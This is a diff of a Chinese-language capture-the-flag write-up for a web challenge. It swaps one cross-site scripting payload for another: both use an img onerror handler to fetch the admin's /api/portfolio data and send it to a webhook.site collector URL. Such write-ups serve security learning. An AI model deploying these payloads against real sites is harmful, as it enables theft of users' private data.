@@ -239,13 +239,9 @@ app.listen(PORT, () => {
 這題需要使用XSS去偷admin的資料，但不是偷cookie，所以這題比較少人解
 
 Payload
-```
-<img src="#" onerror="fetch("/api/portfolio").then(res=>res.json()).then(res=>fetch("https://webhook.site/3923ff74-968d-46db-bb20-727f2068df0e",{method:"POST",body:JSON.stringify(res)}))">
-```
 
-加上html encode
 ```
-<img src="#" onerror="fetch(&quot;/api/portfolio&quot;).then(res=>res.json()).then(res=>fetch(&quot;https://webhook.site/3923ff74-968d-46db-bb20-727f2068df0e&quot;,{method:&quot;POST&quot;,body:JSON.stringify(res)}))">
+<img src=x onerror=fetch('/api/portfolio').then(r=&gt;{r.text().then(t=&gt;fetch('https://webhook.site/f25d50d9-9c87-4bce-8177-05a3360c5279/?='+btoa(t)))})>
 ```
 
 ![](https://i.imgur.com/A2tFSHS.png)
